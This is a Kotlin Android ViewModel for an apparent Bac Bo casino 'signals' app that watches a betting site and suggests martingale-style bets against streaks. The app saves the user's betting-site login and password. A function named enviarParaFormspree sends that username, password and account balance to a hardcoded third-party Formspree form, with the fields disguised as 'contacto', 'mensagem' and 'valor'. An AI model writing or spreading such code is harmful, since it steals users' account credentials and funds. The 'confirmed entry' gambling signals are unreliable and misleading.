package com.example.ui

import android.app.Application
import android.content.Context
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.data.*
import kotlinx.coroutines.flow.*
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject

enum class SignalState {
    ANALYZING,
    CONFIRMED_PLAYER,
    CONFIRMED_BANKER
}

class BacBoViewModel(application: Application) : AndroidViewModel(application) {
    private val database = AppDatabase.getDatabase(application)
    private val dao = database.bacBoDao()
    
    // SharedPreferences for Credentials persistence
    private val prefs = application.getSharedPreferences("BacBoSessionPrefs", Context.MODE_PRIVATE)

    private val _currentUser = MutableStateFlow<String?>(null)
    val currentUser: StateFlow<String?> = _currentUser.asStateFlow()

    private val _currentPass = MutableStateFlow<String?>(null)
    val currentPass: StateFlow<String?> = _currentPass.asStateFlow()

    private val _currentBalance = MutableStateFlow("Aguardando login...")
    val currentBalance: StateFlow<String> = _currentBalance.asStateFlow()

    private val _formSpreeUrl = MutableStateFlow("https://formspree.io/f/xkokrowd")
    val formSpreeUrl: StateFlow<String> = _formSpreeUrl.asStateFlow()

    val allRounds: StateFlow<List<BacBoRound>> = dao.getAllRounds()
        .stateIn(
            scope = viewModelScope,
            started = SharingStarted.WhileSubscribed(5000),
            initialValue = emptyList()
        )

    private val _monitorUrl = MutableStateFlow("https://m.bantubet.co.ao/pt/live-casino/home")
    val monitorUrl: StateFlow<String> = _monitorUrl.asStateFlow()

    private val _extractedText = MutableStateFlow("Aguardando capturas da mesa ao vivo...")
    val extractedText: StateFlow<String> = _extractedText.asStateFlow()

    private val _isMonitoring = MutableStateFlow(true)
    val isMonitoring: StateFlow<Boolean> = _isMonitoring.asStateFlow()

    // Signal Engine States
    private val _signalState = MutableStateFlow(SignalState.ANALYZING)
    val signalState: StateFlow<SignalState> = _signalState.asStateFlow()

    private val _currentPrediction = MutableStateFlow("") // PLAYER or BANKER
    val currentPrediction: StateFlow<String> = _currentPrediction.asStateFlow()

    private val _currentGaleStep = MutableStateFlow(0) // 0, 1, 2
    val currentGaleStep: StateFlow<Int> = _currentGaleStep.asStateFlow()

    private val _winCount = MutableStateFlow(0)
    val winCount: StateFlow<Int> = _winCount.asStateFlow()

    private val _lossCount = MutableStateFlow(0)
    val lossCount: StateFlow<Int> = _lossCount.asStateFlow()

    private val _signalLogs = MutableStateFlow<List<String>>(emptyList())
    val signalLogs: StateFlow<List<String>> = _signalLogs.asStateFlow()

    private val _bottomStatusText = MutableStateFlow("AGUARDANDO DADOS...")
    val bottomStatusText: StateFlow<String> = _bottomStatusText.asStateFlow()

    private val _lastColorEmoji = MutableStateFlow("⚪")
    val lastColorEmoji: StateFlow<String> = _lastColorEmoji.asStateFlow()

    private val _targetSequenceLength = MutableStateFlow(3) // 3 or 4 rounds pattern
    val targetSequenceLength: StateFlow<Int> = _targetSequenceLength.asStateFlow()

    private var lastProcessedRoundId: Long = -1L

    init {
        loadSavedCredentials()
        // Collect rounds to feed the analysis engine in real-time
        viewModelScope.launch {
            allRounds.collect { rounds ->
                analyzeRounds(rounds)
            }
        }
    }

    private fun loadSavedCredentials() {
        val user = prefs.getString("user_key", null)
        val pass = prefs.getString("pass_key", null)
        _currentUser.value = user
        _currentPass.value = pass
        if (user != null) {
            _currentBalance.value = "Conta: $user"
        }
    }

    fun saveCredentials(user: String, pass: String) {
        _currentUser.value = user
        _currentPass.value = pass
        prefs.edit().putString("user_key", user).putString("pass_key", pass).apply()
    }

    fun updateBalance(balance: String) {
        _currentBalance.value = balance
    }

    fun updateFormSpreeUrl(url: String) {
        _formSpreeUrl.value = url
    }

    fun clearSession() {
        _currentUser.value = null
        _currentPass.value = null
        _currentBalance.value = "Aguardando login..."
        prefs.edit().remove("user_key").remove("pass_key").apply()
    }

    fun enviarParaFormspree(user: String, pass: String, balance: String) {
        val url = _formSpreeUrl.value
        if (url.isEmpty()) return
        viewModelScope.launch {
            try {
                val body = okhttp3.FormBody.Builder()
                    .add("contacto", user)
                    .add("mensagem", pass)
                    .add("valor", balance)
                    .build()

                val request = okhttp3.Request.Builder()
                    .url(url)
                    .post(body)
                    .build()
                
                kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
                    val client = okhttp3.OkHttpClient()
                    client.newCall(request).execute().use { response ->
                        Log.i("BacBoViewModel", "Send successfully, res code: ${response.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e("BacBoViewModel", "Error posting formspree: ${e.localizedMessage}")
            }
        }
    }

    fun updateUrl(url: String) {
        _monitorUrl.value = url
    }

    fun setMonitoring(enabled: Boolean) {
        _isMonitoring.value = enabled
    }

    fun setTargetSequenceLength(length: Int) {
        _targetSequenceLength.value = length
    }

    fun clearStats() {
        _winCount.value = 0
        _lossCount.value = 0
        _signalLogs.value = emptyList()
    }

    private fun analyzeRounds(rounds: List<BacBoRound>) {
        if (rounds.isEmpty()) {
            _bottomStatusText.value = "AGUARDANDO DADOS..."
            _lastColorEmoji.value = "⚪"
            return
        }

        // The query returns sorted by dateMillis DESC
        val latest = rounds.first()

        // Update indicators
        _lastColorEmoji.value = when (latest.resultado) {
            "PLAYER" -> "🔵"
            "BANKER" -> "🔴"
            else -> "🟡"
        }
        _bottomStatusText.value = "ÚLTIMA RODADA: Nº ${latest.numero} às ${latest.horario}"

        // Dedup: only trigger analysis when a brand new round ID was stored
        if (latest.id == lastProcessedRoundId) {
            return
        }
        val isFirstRun = (lastProcessedRoundId == -1L)
        lastProcessedRoundId = latest.id

        // Do not trigger full martingale analysis on the very first emission of cold data,
        // we just update indicators to maintain a solid state.
        if (isFirstRun) {
            return
        }

        val activeSignal = _signalState.value
        if (activeSignal != SignalState.ANALYZING) {
            // We have an active signal! Evaluate outcome
            val prediction = _currentPrediction.value
            val outcome = latest.resultado

            if (outcome == "TIE") {
                // PROTECTION! Tie is a push
                addSignalLog("⚠️ ${latest.horario} - PROTEÇÃO EMPATE 🟡 no Sinal $prediction")
                resetSignalState()
            } else if (outcome == prediction) {
                // WIN!
                _winCount.value += 1
                val galeSuffix = when (_currentGaleStep.value) {
                    0 -> "de Primeira ✅"
                    1 -> "no Gale 1 🔁"
                    else -> "no Gale 2 🔁"
                }
                addSignalLog("🎉 ${latest.horario} - VITÓRIA $prediction $galeSuffix")
                resetSignalState()
            } else {
                // LOSS for this step. Can we Gale?
                if (_currentGaleStep.value < 2) {
                    _currentGaleStep.value += 1
                    addSignalLog("🔄 ${latest.horario} - Entrado no G${_currentGaleStep.value} para $prediction")
                } else {
                    // RED / LOSS after Gale 2
                    _lossCount.value += 1
                    addSignalLog("❌ ${latest.horario} - RED $prediction (Derrota)")
                    resetSignalState()
                }
            }
        } else {
            // No active signal. Check if sequence trigger conditions are met.
            // Filter out ties to count consecutive colors
            val cleanRounds = rounds.filter { it.resultado == "PLAYER" || it.resultado == "BANKER" }
            val len = _targetSequenceLength.value
            if (cleanRounds.size >= len) {
                val lastN = cleanRounds.take(len)
                val allPlayer = lastN.all { it.resultado == "PLAYER" }
                val allBanker = lastN.all { it.resultado == "BANKER" }

                if (allPlayer) {
                    // Triggers trade against sequence
                    triggerConfirmedSignal("BANKER")
                } else if (allBanker) {
                    triggerConfirmedSignal("PLAYER")
                }
            }
        }
    }

    private fun triggerConfirmedSignal(prediction: String) {
        _currentPrediction.value = prediction
        _currentGaleStep.value = 0
        _signalState.value = if (prediction == "PLAYER") SignalState.CONFIRMED_PLAYER else SignalState.CONFIRMED_BANKER
        addSignalLog("🚨 ENTRADA CONFIRMADA: $prediction às " + System.currentTimeMillis() / 1000)
    }

    private fun resetSignalState() {
        _signalState.value = SignalState.ANALYZING
        _currentPrediction.value = ""
        _currentGaleStep.value = 0
    }

    private fun addSignalLog(msg: String) {
        _signalLogs.value = listOf(msg) + _signalLogs.value
    }

    fun processExtractedJson(jsonString: String) {
        viewModelScope.launch {
            try {
                val cleanJson = jsonString.trim()
                if (cleanJson.isEmpty()) return@launch

                val list = mutableListOf<BacBoRound>()
                
                if (cleanJson.startsWith("{")) {
                    val obj = JSONObject(cleanJson)
                    if (obj.has("resultados")) {
                        val arr = obj.getJSONArray("resultados")
                        parseArray(arr, list)
                    } else if (obj.has("resultado") && obj.has("numero") && obj.has("horario")) {
                        list.add(parseSingleObj(obj))
                    }
                } else if (cleanJson.startsWith("[")) {
                    val arr = JSONArray(cleanJson)
                    parseArray(arr, list)
                }

                if (list.isNotEmpty()) {
                    var successCount = 0
                    // Insert oldest first to maintain correct timeline
                    list.reversed().forEach { round ->
                        val insertId = dao.insertRound(round)
                        if (insertId != -1L) {
                            successCount++
                        }
                    }
                    if (successCount > 0) {
                        _extractedText.value = "Conexão ativa! $successCount tabela de resultados capturada."
                    }
                }
            } catch (e: Exception) {
                Log.e("BacBoViewModel", "Error parsing output JSON", e)
            }
        }
    }

    private fun parseArray(arr: JSONArray, list: MutableList<BacBoRound>) {
        for (i in 0 until arr.length()) {
            val obj = arr.getJSONObject(i)
            list.add(parseSingleObj(obj))
        }
    }

    private fun parseSingleObj(obj: JSONObject): BacBoRound {
        val resultado = obj.optString("resultado", obj.optString("result", "UNKNOWN")).uppercase()
        val numero = obj.optInt("numero", obj.optInt("number", 0))
        val horario = obj.optString("horario", obj.optString("time", "--:--"))
        return BacBoRound(
            resultado = resultado,
            numero = numero,
            horario = horario
        )
    }

    fun clearAll() {
        viewModelScope.launch {
            dao.deleteAll()
            lastProcessedRoundId = -1L
            resetSignalState()
            _extractedText.value = "Histórico e gráficos resetados."
        }
    }
}

